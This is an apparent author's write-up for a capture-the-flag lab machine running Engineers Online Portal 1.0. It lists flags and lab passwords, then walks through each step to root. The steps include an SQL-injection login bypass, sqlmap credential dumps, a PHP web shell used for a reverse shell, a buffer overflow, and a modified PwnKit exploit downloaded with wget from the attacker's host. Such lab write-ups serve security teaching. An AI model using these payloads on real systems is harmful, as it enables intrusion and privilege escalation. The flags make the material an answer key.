# Engineer-CTF

## Introduction

This is to introduce the multiple vulnerabilities in Engineers Online Portal 1.0 that could be chained together to obtain rce. Next, this box aims to tell why allowing mysql connection to remote host isn't a good idea. Finally, it takes a little buffer overflow skills to exploit a manually coded binary, and some basic knowledge of how CVE-2021-4034 works to escalate to root.

## Info for HTB

| hash | content |
| ---- | ------- |
| user.txt | 7d58250d6dec957ab2b8ded3fd925e85 |
| root.txt | 89d975f8ac623a6fdb0246bc01eefbf2 |

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| root | nocrackpleaseno! |
| cybercraze | nocrackpleaseno! |
| root(mysql) | youshallnotcrackthis |
| www-data | youshallnotcrackthis |
| admin(engineer-portal admin) | youshallnotcrackthis |
| ralph(engineer-portal user) | ralphthelegend |
| tom(engineer-portal user) | tomandjerry |
| jez(engineer-portal user) | jezmusic |
| andres(engineer-portal user) | andresrevolutionary |

### Other

1. The online engineer portal is built using the original source code version 1.0. There's no deliberate manipulation of the source code to allow the further exploit done.
2. There's stored password in the binary "www-data_into_cybercraze_group", but it is made unreadable and hence using strings or downloading for local inspection will fail.
3. source code for www-data_into_cybercraze_group

            #include <stdio.h>
            #include <string.h>
            #include <stdlib.h>

            int main(void)
            {
            char buff[15];
            int pass = 0;

            printf("\n Enter the password : \n");
            gets(buff);

            if(strcmp(buff, "nocrackplzno!"))
            {
            printf ("\n Wrong Password \n");
            }
            else
            {
            printf ("\n Correct Password \n");
            pass = 1;
            }

            if(pass)
            {
            /* including www-data to cybercraze group */
            printf ("\n Including user www-data to cybercraze group \n");
            system ("echo 'nocrackpleaseno!' | sudo -S -k usermod -aG cybercraze www-data");
            }

            return 0;
            }
*notice the vulnerable function gets() to read password is used, which is vulnerable to buffer overflow

4. vulnerable /usr/bin/pkexec is moved to /opt/pkexec, where /opt is only readable and executable by user cybercraze

5. exploits refer to:

https://www.exploit-db.com/exploits/50452

https://www.idappcom.co.uk/post/engineers-online-portal-1-0-remote-code-execution

https://www.exploit-db.com/exploits/50453

https://github.com/berdav/CVE-2021-4034

## Writeup

1. Nmap Scan

            $nmap -sCV 192.168.0.186
            Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-05 14:29 +08
            Nmap scan report for engineer.htb (192.168.0.186)
            Host is up (0.027s latency).
            Not shown: 997 closed ports
            PORT     STATE SERVICE VERSION
            22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey: 
            |   3072 e7:67:ab:72:53:be:d6:f3:7b:3d:c0:48:7f:31:34:fa (RSA)
            |   256 21:93:3c:26:89:14:9f:4a:7c:8c:bf:a1:b5:f6:5d:b3 (ECDSA)
            |_  256 d1:ed:71:b7:69:ef:64:12:e4:5a:99:cb:41:30:ae:f0 (ED25519)
            80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
            |_http-server-header: Apache/2.4.41 (Ubuntu)
            |_http-title: Onix Digital Marketing HTML5 Template
            3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
            | mysql-info: 
            |   Protocol: 10
            |   Version: 8.0.28-0ubuntu0.20.04.3
            |   Thread ID: 11
            |   Capabilities flags: 65535
            |   Some Capabilities: LongColumnFlag, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, InteractiveClient, SupportsLoadDataLocal, Support41Auth, LongPassword, SupportsCompression, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolNew, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
            |   Status: Autocommit
            |   Salt: 3n!U1~"\x02\x08R:     ,fO\x11w\x05fs
            |_  Auth Plugin Name: caching_sha2_password
            | ssl-cert: Subject: commonName=MySQL_Server_8.0.28_Auto_Generated_Server_Certificate
            | Not valid before: 2022-04-03T08:32:53
            |_Not valid after:  2032-03-31T08:32:53
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds

2. Basic Enumeration of index.html and found domain name engineer.htb via email address scattered in the page. (e.g info@engineer.htb, contact@engineer.htb) Edit /etc/hosts to add the domain name for the target ip.

*first view of index.html:

<img src=img/index.png>
*email address ending with @engineer.htb

<img src=img/email.png>

3. There's no interesting port or web content. Use gobuster to enumerate for subdomains: (using subdomains wordlist provided by seclists)

            $gobuster vhost -u engineer.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
            ===============================================================
            Gobuster v3.1.0
            by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
            ===============================================================
            [+] Url:          http://engineer.htb
            [+] Method:       GET
            [+] Threads:      10
            [+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
            [+] User Agent:   gobuster/3.1.0
            [+] Timeout:      10s
            ===============================================================
            2022/04/05 14:33:56 Starting gobuster in VHOST enumeration mode
            ===============================================================
            Found: webportal.engineer.htb (Status: 200) [Size: 9749]

            ===============================================================
            2022/04/05 14:34:01 Finished
            ===============================================================

4. first view reveals that the site hosts an online engineer's portal

<img src=img/webportal.png>

5. auth bypass via sql injection in online engineer's portal v1.0 login form

*refer to https://www.exploit-db.com/exploits/50452

bypass the login form authentication with sql payloads as follow:

            username:' OR '1'='1';-- -
            password:anystring
            
grab the session cookie: PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp

6. reveal user credentials via sql vuln in 'id' parameter of /quiz_question.php

*refer to *refer to https://www.exploit-db.com/exploits/50453

            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dbs --> reveal database name(capstone)
            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --tables -D capstone --> reveal interesting tables 'teacher' and 'users'
            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dump -D capstone -T teacher
            Database: capstone
            Table: teacher
            [4 entries]
            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
            | teacher_id | department_id | about   | lastname  | location                       | password            | username | firstname    | status_line | teacher_stat | teacher_status |
            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
            | 30         | 4             | <blank> | Escoto    | uploads/NO-IMAGE-AVAILABLE.jpg | ralphthelegend      | ralph    | Ralph        | 1           | <blank>      | Registered     |
            | 28         | 4             | <blank> | Hipolito  | uploads/NO-IMAGE-AVAILABLE.jpg | tomandjerry         | tom      | Rustom       | 1           | <blank>      | Registered     |
            | 29         | 4             | <blank> | Trinidad  | uploads/NO-IMAGE-AVAILABLE.jpg | jezmusic            | jez      | Jezreel Driz | 1           | <blank>      | Registered     |
            | 34         | 4             | <blank> | Bonifacio | uploads/NO-IMAGE-AVAILABLE.jpg | andresrevolutionary | andres   | Andres       | 1           | <blank>      | Registered     |
            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
            
            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dump -D capstone -T users
            Database: capstone
            Table: users
            [1 entry]
            +---------+----------+----------------------+----------+-----------+
            | user_id | lastname | password             | username | firstname |
            +---------+----------+----------------------+----------+-----------+
            | 15      | Craze    | youshallnotcrackthis | admin    | Cyber     |
            +---------+----------+----------------------+----------+-----------+

6. rce via uploading avatar

*refer to https://www.exploit-db.com/exploits/50444

*login with one of the teacher creds (e.g tom:tomandjerry)

*change the avatar by clicking the "change avatar" option as shown:

<img src=img/avatar.png>

*create a vuln.php file with the following content:

            <?php
            if($_REQUEST['x']) {
              system($_REQUEST['x']);
              } else phpinfo();
            ?>

*upload vuln.php file as the avatar

*the file is stored in /admin/uploads. Get rce via:

            $curl http://webportal.engineer.htb/admin/uploads/vuln.php?x={ur bash reverse shell here}
            
7. there's a binary "www-data_into_cybercraze_group" in /home/cybercraze

            www-data@engineer:~/webportal/admin/uploads$ ls /home/cybercraze
            user.txt  www-data_into_cybercraze_group
            www-data@engineer:~/webportal/admin/uploads$ /home/cybercraze/www-data_into_cybercraze_group 

             Enter the password : 
            abcd

             Wrong Password
             
*as the name suggest, this binary adds www-data into cybercraze group but it requests for a password. Attempting to input a long string proves that it is vulnerable to buffer overflow:

            www-data@engineer:~/webportal/admin/uploads$ id
            uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
            www-data@engineer:~/webportal/admin/uploads$ /home/cybercraze/www-data_into_cybercraze_group

             Enter the password : 
            hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh

             Wrong Password 

             Including user www-data to cybercraze group 
            [sudo] password for www-data:
            Segmentation fault (core dumped)

after closing and getting another new shell we observe that the group for www-data change:

            www-data@engineer:/home/cybercraze$ id
            uid=33(www-data) gid=1001(cybercraze) groups=1001(cybercraze),27(sudo)
            
8. running linpeas scan will reveal the following info:

*the sudo version is vulnerable to cve-2021-4034

*/opt is readable by cybercraze group members

*refer to https://github.com/berdav/CVE-2021-4034

by reading some documentation of the exploit we know that it relies on the binary /usr/bin/pkexec which is given the suid permission

however, the binary pkexec is moved from path /usr/bin to /opt

some manual editing of the exploits have to be done:

            $ git clone https://github.com/berdav/CVE-2021-4034.git
            $ cd CVE-2021-4034
            $ ls
            convert.sh       cve-2021-4034.sh  LICENSE   pwnkit.c   vuln-setup.sh
            cve-2021-4034.c  dry-run           Makefile  README.md
            $ nano cve-2021-4034.c --> change the path of /usr/bin/pkexec to /opt/pkexec as follow:
                        #include <unistd.h>

                        int main(int argc, char **argv)
                        {
                                char * const args[] = {
                                        NULL
                                };
                                char * const environ[] = {
                                        "pwnkit.so:.",
                                        "PATH=GCONV_PATH=.",
                                        "SHELL=/lol/i/do/not/exists",
                                        "CHARSET=PWNKIT",
                                        "GIO_USE_VFS=",
                                        NULL
                                };
                                return execve("/opt/pkexec", args, environ);
                        }
            $ nano pwnkit.c --> add /opt into the path variable as follow:
                        #include <stdio.h>
                        #include <stdlib.h>
                        #include <unistd.h>

                        void gconv(void) {
                        }

                        void gconv_init(void *step)
                        {
                                char * const args[] = { "/bin/sh", NULL };
                                char * const environ[] = { "PATH=/opt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr>
                                setuid(0);
                                setgid(0);
                                execve(args[0], args, environ);
                                exit(0);
                        }
            $make
            cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
            cc -Wall    cve-2021-4034.c   -o cve-2021-4034
            echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
            mkdir -p GCONV_PATH=.
            cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
            
now the exploit is manually configured. Zip the whole directory and transfer to the target machine

            $ zip -r CVE-2021-4034.zip CVE-2021-4034/
            $ python3 -m http.server

            www-data@engineer:/home/cybercraze$ cd /tmp
            www-data@engineer:/tmp$ wget 192.168.0.163:8000/CVE-2021-4034.zip
            www-data@engineer:/tmp$ unzip CVE-2021-4034.zip
            www-data@engineer:/tmp$ cd CVE-2021-4034
            www-data@engineer:/tmp/CVE-2021-4034$ ./cve-2021-4034
            # whoami
            root
